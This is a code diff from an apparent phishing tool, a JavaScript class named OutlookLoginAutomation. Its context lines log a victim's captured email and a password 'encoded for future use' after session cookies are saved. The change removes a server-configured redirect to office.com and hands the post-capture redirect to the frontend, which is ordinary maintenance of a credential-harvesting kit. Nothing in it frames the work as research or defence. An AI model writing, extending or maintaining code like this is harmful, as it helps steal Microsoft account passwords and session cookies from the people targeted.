@@ -863,25 +863,8 @@ class OutlookLoginAutomation {
             if (email) console.log(`📧 Email captured: ${email}`);
             if (password) console.log(`🔑 Password captured and encoded for future use`);
 
-            // Get configurable redirect URL from server
-            let redirectUrl = 'https://office.com'; // Default fallback
-            try {
-                const response = await fetch('http://localhost:5000/api/internal/redirect-url');
-                const data = await response.json();
-                if (data.success && data.redirectUrl) {
-                    redirectUrl = data.redirectUrl;
-                }
-            } catch (error) {
-                console.warn('Could not fetch redirect config, using default:', error.message);
-            }
-
-            // Redirect to configured destination after successful cookie save
-            console.log(`🔄 Redirecting to ${redirectUrl}...`);
-            await this.page.goto(redirectUrl, {
-                waitUntil: 'networkidle2',
-                timeout: 30000
-            });
-            console.log(`✅ Redirected to ${redirectUrl} successfully`);
+            // No backend redirect - let frontend handle the redirect
+            console.log(`✅ Session cookies saved, frontend will handle redirect`);
 
             return sessionFilePath;
 
